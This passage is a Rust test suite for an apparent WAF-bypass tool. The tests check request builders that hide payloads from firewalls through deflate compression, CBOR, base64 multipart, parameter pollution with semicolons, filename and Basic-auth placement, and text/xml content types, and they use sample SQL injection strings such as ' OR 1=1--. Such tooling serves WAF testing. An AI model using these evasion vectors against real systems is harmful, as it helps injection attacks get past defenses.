        let v = VECTORS.iter().find(|v| v.name == "POST-json-deflate").unwrap();
        let req = build_request_for_vector(v, &h, "http://x/", "q", "abc", 0)
            .unwrap()
            .build()
            .unwrap();
        assert_eq!(req.headers().get("content-type").unwrap(), "application/json");
    }

    #[test]
    fn build_post_json_deflate_body_is_not_plaintext_json() {
        // The point of compression-confusion: bytes on the wire
        // must not be readable as JSON.
        let h = http();
        let v = VECTORS.iter().find(|v| v.name == "POST-json-deflate").unwrap();
        let req = build_request_for_vector(v, &h, "http://x/", "q", "abc", 0)
            .unwrap()
            .build()
            .unwrap();
        let body = req.body().and_then(|b| b.as_bytes()).unwrap_or(b"");
        let s = String::from_utf8_lossy(body);
        assert!(!s.contains("\"q\""), "compressed body must hide the param: {s}");
    }

    #[test]
    fn build_post_json_deflate_round_trips_under_deflate_decompression() {
        use wafrift_encoding::compression::{Algorithm, CompressedBody, decompress};
        let h = http();
        let v = VECTORS.iter().find(|v| v.name == "POST-json-deflate").unwrap();
        let req = build_request_for_vector(v, &h, "http://x/", "q", "abc", 0)
            .unwrap()
            .build()
            .unwrap();
        let body = req.body().and_then(|b| b.as_bytes()).unwrap_or(b"");
        let recovered = decompress(&CompressedBody {
            body: body.to_vec(),
            content_encoding: Algorithm::Deflate.content_encoding().to_string(),
        })
        .expect("deflate round-trip");
        let s = String::from_utf8(recovered).unwrap();
        let v: serde_json::Value = serde_json::from_str(&s).unwrap();
        assert_eq!(v["q"], "abc");
    }

    #[test]
    fn build_post_json_deflate_preserves_unicode_in_round_trip() {
        use wafrift_encoding::compression::{Algorithm, CompressedBody, decompress};
        let h = http();
        let v = VECTORS.iter().find(|v| v.name == "POST-json-deflate").unwrap();
        let req = build_request_for_vector(v, &h, "http://x/", "q", "café 中文 ' OR 1=1--", 0)
            .unwrap()
            .build()
            .unwrap();
        let body = req.body().and_then(|b| b.as_bytes()).unwrap_or(b"");
        let recovered = decompress(&CompressedBody {
            body: body.to_vec(),
            content_encoding: Algorithm::Deflate.content_encoding().to_string(),
        })
        .unwrap();
        let json: serde_json::Value =
            serde_json::from_str(&String::from_utf8(recovered).unwrap()).unwrap();
        assert_eq!(json["q"], "café 中文 ' OR 1=1--");
    }

    // ── POST-form-deflate ──────────────────────────────────────

    #[test]
    fn build_post_form_deflate_sets_content_encoding_deflate() {
        let h = http();
        let v = VECTORS.iter().find(|v| v.name == "POST-form-deflate").unwrap();
        let req = build_request_for_vector(v, &h, "http://x/", "q", "abc", 0)
            .unwrap()
            .build()
            .unwrap();
        assert_eq!(req.headers().get("content-encoding").unwrap(), "deflate");
    }

    #[test]
    fn build_post_form_deflate_round_trips_under_deflate_decompression() {
        use wafrift_encoding::compression::{Algorithm, CompressedBody, decompress};
        let h = http();
        let v = VECTORS.iter().find(|v| v.name == "POST-form-deflate").unwrap();
        let req = build_request_for_vector(v, &h, "http://x/", "q", "PAYLOAD", 0)
            .unwrap()
            .build()
            .unwrap();
        let body = req.body().and_then(|b| b.as_bytes()).unwrap_or(b"");
        let recovered = decompress(&CompressedBody {
            body: body.to_vec(),
            content_encoding: Algorithm::Deflate.content_encoding().to_string(),
        })
        .unwrap();
        assert_eq!(String::from_utf8(recovered).unwrap(), "q=PAYLOAD");
    }

    #[test]
    fn build_post_form_deflate_content_type_stays_form_urlencoded() {
        let h = http();
        let v = VECTORS.iter().find(|v| v.name == "POST-form-deflate").unwrap();
        let req = build_request_for_vector(v, &h, "http://x/", "q", "abc", 0)
            .unwrap()
            .build()
            .unwrap();
        assert_eq!(
            req.headers().get("content-type").unwrap(),
            "application/x-www-form-urlencoded"
        );
    }

    #[test]
    fn build_post_form_deflate_body_hides_param_in_compressed_blob() {
        let h = http();
        let v = VECTORS.iter().find(|v| v.name == "POST-form-deflate").unwrap();
        let req = build_request_for_vector(v, &h, "http://x/", "q", "abc", 0)
            .unwrap()
            .build()
            .unwrap();
        let body = req.body().and_then(|b| b.as_bytes()).unwrap_or(b"");
        let s = String::from_utf8_lossy(body);
        assert!(!s.contains("q=abc"), "compressed body still readable: {s}");
    }

    // ── POST-yaml ──────────────────────────────────────────────

    #[test]
    fn build_post_yaml_sets_application_yaml_content_type() {
        let h = http();
        let v = VECTORS.iter().find(|v| v.name == "POST-yaml").unwrap();
        let req = build_request_for_vector(v, &h, "http://x/", "q", "x", 0)
            .unwrap()
            .build()
            .unwrap();
        assert_eq!(req.headers().get("content-type").unwrap(), "application/yaml");
    }

    #[test]
    fn build_post_yaml_body_has_key_colon_value_shape() {
        let h = http();
        let v = VECTORS.iter().find(|v| v.name == "POST-yaml").unwrap();
        let req = build_request_for_vector(v, &h, "http://x/", "q", "value", 0)
            .unwrap()
            .build()
            .unwrap();
        let body = req.body().and_then(|b| b.as_bytes()).unwrap_or(b"");
        let s = std::str::from_utf8(body).unwrap();
        assert!(s.starts_with("q: "), "yaml must lead with key+colon: {s}");
        assert!(s.contains("value"));
    }

    #[test]
    fn build_post_yaml_uses_double_quoted_scalar_form() {
        // Double-quoted YAML scalars accept JSON-style escapes and
        // survive every payload byte. Anti-rig: a future refactor
        // that switched to bare or single-quoted would break on
        // payloads containing quotes / control chars.
        let h = http();
        let v = VECTORS.iter().find(|v| v.name == "POST-yaml").unwrap();
        let req = build_request_for_vector(v, &h, "http://x/", "q", "x", 0)
            .unwrap()
            .build()
            .unwrap();
        let body = req.body().and_then(|b| b.as_bytes()).unwrap_or(b"");
        let s = std::str::from_utf8(body).unwrap();
        assert!(s.contains("\"x\""), "must be double-quoted: {s}");
    }

    #[test]
    fn build_post_yaml_escapes_double_quotes_in_payload() {
        let h = http();
        let v = VECTORS.iter().find(|v| v.name == "POST-yaml").unwrap();
        let req = build_request_for_vector(v, &h, "http://x/", "q", "say \"hi\"", 0)
            .unwrap()
            .build()
            .unwrap();
        let body = req.body().and_then(|b| b.as_bytes()).unwrap_or(b"");
        let s = std::str::from_utf8(body).unwrap();
        // The wire MUST escape the inner quotes; otherwise YAML
        // parser would see `"say "hi""` and split early.
        assert!(s.contains("\\\""), "inner quotes must escape: {s}");
    }

    #[test]
    fn build_post_yaml_escapes_newlines_so_scalar_does_not_break() {
        let h = http();
        let v = VECTORS.iter().find(|v| v.name == "POST-yaml").unwrap();
        let req = build_request_for_vector(v, &h, "http://x/", "q", "a\nb", 0)
            .unwrap()
            .build()
            .unwrap();
        let body = req.body().and_then(|b| b.as_bytes()).unwrap_or(b"");
        let s = std::str::from_utf8(body).unwrap();
        // Raw newline would terminate the scalar early. The
        // serializer must emit `\n` as the two-char escape.
        assert!(s.contains("\\n"), "newline must be escaped: {s:?}");
        // Exactly one trailing real newline (YAML doc terminator).
        assert_eq!(s.matches('\n').count(), 1);
    }

    #[test]
    fn build_post_yaml_empty_payload_emits_empty_quoted_scalar() {
        let h = http();
        let v = VECTORS.iter().find(|v| v.name == "POST-yaml").unwrap();
        let req = build_request_for_vector(v, &h, "http://x/", "q", "", 0)
            .unwrap()
            .build()
            .unwrap();
        let body = req.body().and_then(|b| b.as_bytes()).unwrap_or(b"");
        let s = std::str::from_utf8(body).unwrap();
        assert_eq!(s, "q: \"\"\n");
    }

    #[test]
    fn build_post_yaml_param_name_appears_as_root_key() {
        for param in ["id", "user", "filter", "search"] {
            let h = http();
            let v = VECTORS.iter().find(|v| v.name == "POST-yaml").unwrap();
            let req = build_request_for_vector(v, &h, "http://x/", param, "x", 0)
                .unwrap()
                .build()
                .unwrap();
            let body = req.body().and_then(|b| b.as_bytes()).unwrap_or(b"");
            let s = std::str::from_utf8(body).unwrap();
            assert!(s.starts_with(&format!("{param}: ")));
        }
    }

    // ── POST-multipart-b64 ─────────────────────────────────────

    #[test]
    fn build_post_multipart_b64_content_type_includes_boundary() {
        let h = http();
        let v = VECTORS.iter().find(|v| v.name == "POST-multipart-b64").unwrap();
        let req = build_request_for_vector(v, &h, "http://x/", "q", "x", 0xFF)
            .unwrap()
            .build()
            .unwrap();
        let ct = req.headers().get("content-type").unwrap().to_str().unwrap();
        assert!(ct.starts_with("multipart/form-data; boundary="));
        assert!(ct.contains("WafRiftB64Boundaryff"), "ct: {ct}");
    }

    #[test]
    fn build_post_multipart_b64_part_has_base64_transfer_encoding() {
        let h = http();
        let v = VECTORS.iter().find(|v| v.name == "POST-multipart-b64").unwrap();
        let req = build_request_for_vector(v, &h, "http://x/", "q", "x", 0)
            .unwrap()
            .build()
            .unwrap();
        let body = req.body().and_then(|b| b.as_bytes()).unwrap_or(b"");
        let s = std::str::from_utf8(body).unwrap();
        assert!(s.contains("Content-Transfer-Encoding: base64"));
    }

    #[test]
    fn build_post_multipart_b64_payload_decodes_back_to_original() {
        use base64::Engine as _;
        let h = http();
        let v = VECTORS.iter().find(|v| v.name == "POST-multipart-b64").unwrap();
        let original = "' UNION SELECT NULL --";
        let req = build_request_for_vector(v, &h, "http://x/", "q", original, 0)
            .unwrap()
            .build()
            .unwrap();
        let body = req.body().and_then(|b| b.as_bytes()).unwrap_or(b"");
        let s = std::str::from_utf8(body).unwrap();
        // The base64 line lives between the blank-line separator
        // and the trailing `\r\n--<boundary>--`. Strip surrounding
        // lines and decode.
        let after_blank = s.split("\r\n\r\n").nth(1).expect("part body present");
        let b64_line = after_blank.lines().next().unwrap().trim();
        let decoded = base64::engine::general_purpose::STANDARD
            .decode(b64_line)
            .expect("valid base64");
        assert_eq!(std::str::from_utf8(&decoded).unwrap(), original);
    }

    #[test]
    fn build_post_multipart_b64_raw_payload_is_not_present_on_wire() {
        // Anti-rig: a refactor that accidentally fell through to
        // the plaintext multipart shape would emit the raw payload
        // (defeating the point of the vector).
        let h = http();
        let v = VECTORS.iter().find(|v| v.name == "POST-multipart-b64").unwrap();
        let attack = "UNION_SELECT_SECRET_TOKEN";
        let req = build_request_for_vector(v, &h, "http://x/", "q", attack, 0)
            .unwrap()
            .build()
            .unwrap();
        let body = req.body().and_then(|b| b.as_bytes()).unwrap_or(b"");
        let s = std::str::from_utf8(body).unwrap();
        assert!(
            !s.contains(attack),
            "the raw attack string must be hidden behind base64: {s}"
        );
    }

    #[test]
    fn build_post_multipart_b64_part_name_matches_param() {
        let h = http();
        let v = VECTORS.iter().find(|v| v.name == "POST-multipart-b64").unwrap();
        let req = build_request_for_vector(v, &h, "http://x/", "filter", "x", 0)
            .unwrap()
            .build()
            .unwrap();
        let body = req.body().and_then(|b| b.as_bytes()).unwrap_or(b"");
        let s = std::str::from_utf8(body).unwrap();
        assert!(s.contains("name=\"filter\""));
    }

    #[test]
    fn build_post_multipart_b64_boundary_appears_in_body_and_header() {
        let h = http();
        let v = VECTORS.iter().find(|v| v.name == "POST-multipart-b64").unwrap();
        let req = build_request_for_vector(v, &h, "http://x/", "q", "x", 7)
            .unwrap()
            .build()
            .unwrap();
        let ct = req.headers().get("content-type").unwrap().to_str().unwrap();
        let body = req.body().and_then(|b| b.as_bytes()).unwrap_or(b"");
        let body_s = std::str::from_utf8(body).unwrap();
        // The hex part of the boundary string from the header is
        // present in the body too (open + close markers).
        let bnd_marker = "WafRiftB64Boundary7";
        assert!(ct.contains(bnd_marker));
        assert_eq!(
            body_s.matches(bnd_marker).count(),
            2,
            "expect open + close boundary lines: {body_s}"
        );
    }

    #[test]
    fn build_post_multipart_b64_with_non_ascii_payload_decodes_back_byte_identical() {
        use base64::Engine as _;
        let h = http();
        let v = VECTORS.iter().find(|v| v.name == "POST-multipart-b64").unwrap();
        let original = "café 中文 \0\x01\x02 bytes";
        let req = build_request_for_vector(v, &h, "http://x/", "q", original, 0)
            .unwrap()
            .build()
            .unwrap();
        let body = req.body().and_then(|b| b.as_bytes()).unwrap_or(b"");
        let s = std::str::from_utf8(body).unwrap();
        let after_blank = s.split("\r\n\r\n").nth(1).unwrap();
        let b64_line = after_blank.lines().next().unwrap().trim();
        let decoded = base64::engine::general_purpose::STANDARD
            .decode(b64_line)
            .unwrap();
        assert_eq!(std::str::from_utf8(&decoded).unwrap(), original);
    }

    // ── catalogue presence ─────────────────────────────────────

    #[test]
    fn new_vectors_are_in_catalogue() {
        // Defence: a refactor that dropped any of the new attack
        // surfaces would silently regress the bench scoreboard.
        let names: std::collections::HashSet<&str> =
            VECTORS.iter().map(|v| v.name).collect();
        for required in [
            "POST-form-utf7",
            "POST-json-deflate",
            "POST-form-deflate",
            "POST-yaml",
            "POST-multipart-b64",
        ] {
            assert!(names.contains(required), "missing vector {required}");
        }
    }

    #[test]
    fn deflate_vectors_use_deflate_content_encoding_token() {
        // Anti-rig: a future refactor that mapped Deflate → "gzip"
        // would silently neuter the vector.
        let h = http();
        for name in ["POST-json-deflate", "POST-form-deflate"] {
            let v = VECTORS.iter().find(|v| v.name == name).unwrap();
            let req = build_request_for_vector(v, &h, "http://x/", "q", "x", 0)
                .unwrap()
                .build()
                .unwrap();
            assert_eq!(
                req.headers().get("content-encoding").unwrap(),
                "deflate",
                "{name} must send Content-Encoding: deflate"
            );
        }
    }

    // ── PUT-json / PATCH-json / PUT-form ──────────────────────

    #[test]
    fn build_put_json_uses_put_method_on_wire() {
        let h = http();
        let v = VECTORS.iter().find(|v| v.name == "PUT-json").unwrap();
        let req = build_request_for_vector(v, &h, "http://x/", "q", "x", 0)
            .unwrap()
            .build()
            .unwrap();
        assert_eq!(req.method(), "PUT");
    }

    #[test]
    fn build_put_json_body_is_valid_json_with_param_key() {
        let h = http();
        let v = VECTORS.iter().find(|v| v.name == "PUT-json").unwrap();
        let req = build_request_for_vector(v, &h, "http://x/", "id", "1 OR 1=1", 0)
            .unwrap()
            .build()
            .unwrap();
        let body = req.body().and_then(|b| b.as_bytes()).unwrap_or(b"");
        let s = std::str::from_utf8(body).unwrap();
        let parsed: serde_json::Value = serde_json::from_str(s).unwrap();
        assert_eq!(parsed["id"], "1 OR 1=1");
    }

    #[test]
    fn build_patch_json_uses_patch_method_on_wire() {
        let h = http();
        let v = VECTORS.iter().find(|v| v.name == "PATCH-json").unwrap();
        let req = build_request_for_vector(v, &h, "http://x/", "q", "x", 0)
            .unwrap()
            .build()
            .unwrap();
        assert_eq!(req.method(), "PATCH");
    }

    #[test]
    fn build_patch_json_emits_application_json_content_type() {
        let h = http();
        let v = VECTORS.iter().find(|v| v.name == "PATCH-json").unwrap();
        let req = build_request_for_vector(v, &h, "http://x/", "q", "x", 0)
            .unwrap()
            .build()
            .unwrap();
        assert_eq!(req.headers().get("content-type").unwrap(), "application/json");
    }

    #[test]
    fn build_put_form_uses_put_method_with_form_body() {
        let h = http();
        let v = VECTORS.iter().find(|v| v.name == "PUT-form").unwrap();
        let req = build_request_for_vector(v, &h, "http://x/", "q", "abc", 0)
            .unwrap()
            .build()
            .unwrap();
        assert_eq!(req.method(), "PUT");
        let body = req.body().and_then(|b| b.as_bytes()).unwrap_or(b"");
        assert_eq!(std::str::from_utf8(body).unwrap(), "q=abc");
        assert_eq!(
            req.headers().get("content-type").unwrap(),
            "application/x-www-form-urlencoded"
        );
    }

    #[test]
    fn put_and_patch_json_handle_unicode_payload() {
        let h = http();
        for name in ["PUT-json", "PATCH-json"] {
            let v = VECTORS.iter().find(|v| v.name == name).unwrap();
            let req = build_request_for_vector(v, &h, "http://x/", "q", "café 中文", 0)
                .unwrap()
                .build()
                .unwrap();
            let body = req.body().and_then(|b| b.as_bytes()).unwrap_or(b"");
            let s = std::str::from_utf8(body).unwrap();
            let parsed: serde_json::Value = serde_json::from_str(s).unwrap();
            assert_eq!(parsed["q"], "café 中文", "{name} unicode roundtrip");
        }
    }

    #[test]
    fn put_json_distinct_from_patch_json_by_method_only() {
        // Anti-rig: a refactor that conflated PUT/PATCH would
        // hide one of the methods. Compare method strings.
        let h = http();
        let put_req = build_request_for_vector(
            VECTORS.iter().find(|v| v.name == "PUT-json").unwrap(),
            &h,
            "http://x/",
            "q",
            "x",
            0,
        )
        .unwrap()
        .build()
        .unwrap();
        let patch_req = build_request_for_vector(
            VECTORS.iter().find(|v| v.name == "PATCH-json").unwrap(),
            &h,
            "http://x/",
            "q",
            "x",
            0,
        )
        .unwrap()
        .build()
        .unwrap();
        assert_ne!(put_req.method(), patch_req.method());
    }

    // ── hpp-semicolon ─────────────────────────────────────────

    #[test]
    fn build_hpp_semicolon_uses_get_method() {
        let h = http();
        let v = VECTORS.iter().find(|v| v.name == "hpp-semicolon").unwrap();
        let req = build_request_for_vector(v, &h, "http://x/", "q", "x", 0)
            .unwrap()
            .build()
            .unwrap();
        assert_eq!(req.method(), "GET");
    }

    #[test]
    fn build_hpp_semicolon_url_separates_with_semicolon_not_ampersand() {
        let h = http();
        let v = VECTORS.iter().find(|v| v.name == "hpp-semicolon").unwrap();
        let req = build_request_for_vector(v, &h, "http://example.com/", "q", "attack", 0)
            .unwrap()
            .build()
            .unwrap();
        let url = req.url().to_string();
        // Both occurrences of `q=` must be present.
        assert!(url.contains("q=harmless"), "url={url}");
        assert!(url.contains("q=attack"), "url={url}");
        // The separator between them must be `;`, not `&`. URL
        // encoding may turn it into `%3B` — accept either.
        let between_marker = url
            .find("q=harmless")
            .and_then(|i| url.get(i + "q=harmless".len()..(i + "q=harmless".len() + 3)));
        let sep = between_marker.unwrap_or("");
        assert!(
            sep.starts_with(';') || sep.starts_with("%3B") || sep.starts_with("%3b"),
            "expected ; or %3B between the two q= occurrences, got {sep:?} in {url}"
        );
    }

    #[test]
    fn build_hpp_semicolon_puts_benign_value_first() {
        // Last-occurrence-wins backends (Tomcat default) see the
        // attack; first-occurrence WAFs see harmless.
        let h = http();
        let v = VECTORS.iter().find(|v| v.name == "hpp-semicolon").unwrap();
        let req = build_request_for_vector(v, &h, "http://example.com/", "q", "attack", 0)
            .unwrap()
            .build()
            .unwrap();
        let url = req.url().to_string();
        let h_pos = url.find("q=harmless").unwrap();
        let a_pos = url.find("q=attack").unwrap();
        assert!(h_pos < a_pos, "harmless must precede attack: {url}");
    }

    #[test]
    fn build_hpp_semicolon_does_not_emit_ampersand_between_occurrences() {
        // Anti-rig: a refactor that fell back to the `hpp` builder
        // would emit `&` and lose the Tomcat-specific bypass.
        let h = http();
        let v = VECTORS.iter().find(|v| v.name == "hpp-semicolon").unwrap();
        let req = build_request_for_vector(v, &h, "http://example.com/", "q", "attack", 0)
            .unwrap()
            .build()
            .unwrap();
        let url = req.url().to_string();
        // Between the harmless and attack occurrences, no `&q=`.
        let h_pos = url.find("q=harmless").unwrap();
        let a_pos = url.find("q=attack").unwrap();
        let between = &url[h_pos..a_pos];
        assert!(
            !between.contains("&q="),
            "must not split q= with & in semi-vector: {between}"
        );
    }

    // ── POST-cbor + CBOR encoder ──────────────────────────────

    #[test]
    fn cbor_encoder_emits_map_one_marker_first() {
        let bytes = encode_cbor_string_map("q", "x");
        assert_eq!(bytes[0], 0xA1, "must lead with map(1) marker");
    }

    #[test]
    fn cbor_encoder_short_strings_use_single_byte_header() {
        // For text strings of length ≤ 23, the major-type-3 header
        // is `0x60 | n` — a single byte, no length prefix.
        let bytes = encode_cbor_string_map("q", "abc");
        // After 0xA1, expect 0x61 (text "q" — length 1) then 'q'
        assert_eq!(bytes[1], 0x61);
        assert_eq!(bytes[2], b'q');
        // Then 0x63 (text "abc" — length 3) then 'a','b','c'
        assert_eq!(bytes[3], 0x63);
        assert_eq!(&bytes[4..7], b"abc");
    }

    #[test]
    fn cbor_encoder_24_byte_string_uses_two_byte_header() {
        // 24 bytes is exactly above the 0x60 | 0x17 = 0x77 single-
        // byte ceiling, so the encoder must shift to the 0x78 LL
        // form.
        let v24 = "x".repeat(24);
        let bytes = encode_cbor_string_map("k", &v24);
        // After 0xA1, key header + 'k', then value header...
        let key_end = 1 + 1 + 1; // 0xA1 + 0x61 + 'k'
        assert_eq!(bytes[key_end], 0x78);
        assert_eq!(bytes[key_end + 1], 24);
    }

    #[test]
    fn cbor_encoder_300_byte_string_uses_three_byte_header() {
        // 300 bytes exceeds the 0xFF single-byte-length ceiling,
        // so the encoder must use the 0x79 LL LL big-endian form.
        let v300 = "y".repeat(300);
        let bytes = encode_cbor_string_map("k", &v300);
        let key_end = 1 + 1 + 1;
        assert_eq!(bytes[key_end], 0x79);
        assert_eq!(
            u16::from_be_bytes([bytes[key_end + 1], bytes[key_end + 2]]),
            300
        );
    }

    #[test]
    fn cbor_encoder_round_trips_payload_byte_identical() {
        // Decode our own output by walking the bytes: we know the
        // shape is map(1) + key + value. A correctness check that
        // doesn't depend on a CBOR crate.
        let bytes = encode_cbor_string_map("payload", "' OR 1=1--");
        assert_eq!(bytes[0], 0xA1);
        let key_hdr = bytes[1];
        assert_eq!(key_hdr & 0xE0, 0x60, "key must be text-string major type");
        let key_len = (key_hdr & 0x1F) as usize;
        let key_start = 2;
        let key_end = key_start + key_len;
        let key = std::str::from_utf8(&bytes[key_start..key_end]).unwrap();
        assert_eq!(key, "payload");
        let val_hdr = bytes[key_end];
        let val_len = (val_hdr & 0x1F) as usize;
        let val_start = key_end + 1;
        let val_end = val_start + val_len;
        let val = std::str::from_utf8(&bytes[val_start..val_end]).unwrap();
        assert_eq!(val, "' OR 1=1--");
    }

    #[test]
    fn cbor_encoder_empty_value_emits_zero_length_text_string() {
        let bytes = encode_cbor_string_map("k", "");
        // 0xA1, 0x61, 'k', 0x60 (empty text string)
        assert_eq!(bytes.len(), 4);
        assert_eq!(bytes[3], 0x60);
    }

    #[test]
    fn cbor_encoder_unicode_value_preserves_utf8_bytes() {
        let bytes = encode_cbor_string_map("k", "café");
        // "café" is 5 UTF-8 bytes (c=1, a=1, f=1, é=2)
        let val_start = bytes.len() - 5;
        assert_eq!(&bytes[val_start..], "café".as_bytes());
    }

    #[test]
    fn build_post_cbor_emits_application_cbor_content_type() {
        let h = http();
        let v = VECTORS.iter().find(|v| v.name == "POST-cbor").unwrap();
        let req = build_request_for_vector(v, &h, "http://x/", "q", "x", 0)
            .unwrap()
            .build()
            .unwrap();
        assert_eq!(req.headers().get("content-type").unwrap(), "application/cbor");
    }

    #[test]
    fn build_post_cbor_body_starts_with_map_one_marker() {
        let h = http();
        let v = VECTORS.iter().find(|v| v.name == "POST-cbor").unwrap();
        let req = build_request_for_vector(v, &h, "http://x/", "q", "attack", 0)
            .unwrap()
            .build()
            .unwrap();
        let body = req.body().and_then(|b| b.as_bytes()).unwrap_or(b"");
        assert_eq!(body[0], 0xA1, "CBOR body must begin with map(1): {body:?}");
    }

    #[test]
    fn build_post_cbor_body_contains_payload_bytes_intact() {
        let h = http();
        let v = VECTORS.iter().find(|v| v.name == "POST-cbor").unwrap();
        let req = build_request_for_vector(v, &h, "http://x/", "q", "ATTACK_MARKER", 0)
            .unwrap()
            .build()
            .unwrap();
        let body = req.body().and_then(|b| b.as_bytes()).unwrap_or(b"");
        // The payload bytes must appear verbatim — CBOR text-string
        // major type stores UTF-8 unmodified.
        let needle = b"ATTACK_MARKER";
        assert!(
            body.windows(needle.len()).any(|w| w == needle),
            "payload must reach the wire byte-identical: {body:?}"
        );
    }

    // ── catalogue presence ────────────────────────────────────

    #[test]
    fn new_method_and_axis_vectors_are_in_catalogue() {
        let names: std::collections::HashSet<&str> = VECTORS.iter().map(|v| v.name).collect();
        for required in [
            "PUT-json",
            "PATCH-json",
            "PUT-form",
            "hpp-semicolon",
            "POST-cbor",
        ] {
            assert!(names.contains(required), "missing vector {required}");
        }
    }

    // ── POST-text-xml ─────────────────────────────────────────

    #[test]
    fn build_post_text_xml_uses_text_xml_mime_not_application() {
        // The whole point of this vector — CRS xml-body anchors
        // on `application/xml`; this one MUST say `text/xml`.
        let h = http();
        let v = VECTORS.iter().find(|v| v.name == "POST-text-xml").unwrap();
        let req = build_request_for_vector(v, &h, "http://x/", "q", "x", 0)
            .unwrap()
            .build()
            .unwrap();
        let ct = req.headers().get("content-type").unwrap().to_str().unwrap();
        assert!(ct.starts_with("text/xml"));
        assert!(!ct.starts_with("application/xml"));
    }

    #[test]
    fn build_post_text_xml_body_shape_matches_application_xml() {
        // Body shape is identical to POST-xml — only the
        // Content-Type changes. Same parser eats the bytes.
        let h = http();
        let v = VECTORS.iter().find(|v| v.name == "POST-text-xml").unwrap();
        let req = build_request_for_vector(v, &h, "http://x/", "id", "1=1", 0)
            .unwrap()
            .build()
            .unwrap();
        let body = req.body().and_then(|b| b.as_bytes()).unwrap_or(b"");
        let s = std::str::from_utf8(body).unwrap();
        assert!(s.starts_with("<?xml"));
        assert!(s.contains("<id>"));
        assert!(s.contains("1=1"));
    }

    #[test]
    fn build_post_text_xml_escapes_xml_significant_chars() {
        let h = http();
        let v = VECTORS.iter().find(|v| v.name == "POST-text-xml").unwrap();
        let req = build_request_for_vector(v, &h, "http://x/", "q", "<script>", 0)
            .unwrap()
            .build()
            .unwrap();
        let body = req.body().and_then(|b| b.as_bytes()).unwrap_or(b"");
        let s = std::str::from_utf8(body).unwrap();
        assert!(s.contains("&lt;script&gt;"));
        assert!(!s.contains("<script>"));
    }

    // ── POST-multipart-filename ───────────────────────────────

    #[test]
    fn build_post_multipart_filename_carries_payload_in_filename_param() {
        let h = http();
        let v = VECTORS.iter().find(|v| v.name == "POST-multipart-filename").unwrap();
        let req = build_request_for_vector(v, &h, "http://x/", "upload", "ATTACK", 0)
            .unwrap()
            .build()
            .unwrap();
        let body = req.body().and_then(|b| b.as_bytes()).unwrap_or(b"");
        let s = std::str::from_utf8(body).unwrap();
        assert!(s.contains("filename=\"ATTACK\""), "body: {s}");
    }

    #[test]
    fn build_post_multipart_filename_part_body_is_benign_placeholder() {
        // The part value MUST be benign — the attack lives in the
        // filename. Anti-rig against a refactor that put the
        // payload back in the body where the WAF will see it.
        let h = http();
        let v = VECTORS.iter().find(|v| v.name == "POST-multipart-filename").unwrap();
        let req = build_request_for_vector(v, &h, "http://x/", "upload", "ATTACK_MARKER", 0)
            .unwrap()
            .build()
            .unwrap();
        let body = req.body().and_then(|b| b.as_bytes()).unwrap_or(b"");
        let s = std::str::from_utf8(body).unwrap();
        // The bytes between `\r\n\r\n` and `\r\n--<boundary>--` are
        // the part body. Verify those contain ONLY the placeholder
        // and NOT the attack string.
        let after_blank = s.split("\r\n\r\n").nth(1).unwrap();
        let part_body = after_blank.lines().next().unwrap();
        assert_eq!(
            part_body, "x",
            "part body must be benign placeholder, got {part_body:?}"
        );
        // The attack appears EXACTLY once — in the filename field.
        assert_eq!(s.matches("ATTACK_MARKER").count(), 1);
    }

    #[test]
    fn build_post_multipart_filename_escapes_quotes_in_payload() {
        // Filename per RFC 7578 is a quoted-string — a literal `"`
        // in the payload would terminate the field early. Confirm
        // the builder backslash-escapes them so the multipart parse
        // stays valid.
        let h = http();
        let v = VECTORS.iter().find(|v| v.name == "POST-multipart-filename").unwrap();
        let req = build_request_for_vector(v, &h, "http://x/", "upload", "say \"hi\"", 0)
            .unwrap()
            .build()
            .unwrap();
        let body = req.body().and_then(|b| b.as_bytes()).unwrap_or(b"");
        let s = std::str::from_utf8(body).unwrap();
        // The escaped form `\\"` MUST appear in the wire bytes.
        assert!(
            s.contains("\\\""),
            "inner quotes must be backslash-escaped: {s}"
        );
    }

    #[test]
    fn build_post_multipart_filename_emits_boundary_correctly() {
        let h = http();
        let v = VECTORS.iter().find(|v| v.name == "POST-multipart-filename").unwrap();
        let req = build_request_for_vector(v, &h, "http://x/", "upload", "x", 0xAB)
            .unwrap()
            .build()
            .unwrap();
        let ct = req.headers().get("content-type").unwrap().to_str().unwrap();
        assert!(ct.contains("WafRiftFnBoundaryab"), "ct: {ct}");
    }

    // ── authorization-basic ───────────────────────────────────

    #[test]
    fn build_authorization_basic_sets_basic_auth_header() {
        let h = http();
        let v = VECTORS.iter().find(|v| v.name == "authorization-basic").unwrap();
        let req = build_request_for_vector(v, &h, "http://x/", "q", "user", 0)
            .unwrap()
            .build()
            .unwrap();
        let auth = req.headers().get("authorization").unwrap().to_str().unwrap();
        assert!(auth.starts_with("Basic "));
    }

    #[test]
    fn build_authorization_basic_encodes_payload_as_username_half() {
        use base64::Engine as _;
        let h = http();
        let v = VECTORS.iter().find(|v| v.name == "authorization-basic").unwrap();
        let req = build_request_for_vector(v, &h, "http://x/", "q", "' OR 1=1--", 0)
            .unwrap()
            .build()
            .unwrap();
        let auth = req.headers().get("authorization").unwrap().to_str().unwrap();
        let b64 = auth.strip_prefix("Basic ").unwrap();
        let decoded = base64::engine::general_purpose::STANDARD.decode(b64).unwrap();
        let s = std::str::from_utf8(&decoded).unwrap();
        // Username:password — payload MUST be the user half.
        assert!(s.starts_with("' OR 1=1--:"));
    }

    #[test]
    fn build_authorization_basic_uses_get_method() {
        let h = http();
        let v = VECTORS.iter().find(|v| v.name == "authorization-basic").unwrap();
        let req = build_request_for_vector(v, &h, "http://x/", "q", "x", 0)
            .unwrap()
            .build()
            .unwrap();
        assert_eq!(req.method(), "GET");
    }

    #[test]
    fn build_authorization_basic_attaches_query_param_too() {
        // The endpoint URL still gets the query param — the
        // Authorization carries an EXTRA payload location. Some
        // backends pass-through both for logging; either side
        // could land.
        let h = http();
        let v = VECTORS.iter().find(|v| v.name == "authorization-basic").unwrap();
        let req = build_request_for_vector(v, &h, "http://example.com/", "q", "PAYLOAD", 0)
            .unwrap()
            .build()
            .unwrap();
        let url = req.url().to_string();
        assert!(url.contains("q="), "url should carry the param: {url}");
    }

    // ── catalogue presence (round 3) ──────────────────────────

    #[test]
    fn round_three_vectors_are_in_catalogue() {
        let names: std::collections::HashSet<&str> = VECTORS.iter().map(|v| v.name).collect();
        for required in [
            "POST-text-xml",
            "POST-multipart-filename",
            "authorization-basic",
        ] {
            assert!(names.contains(required), "missing vector {required}");
        }
    }
}
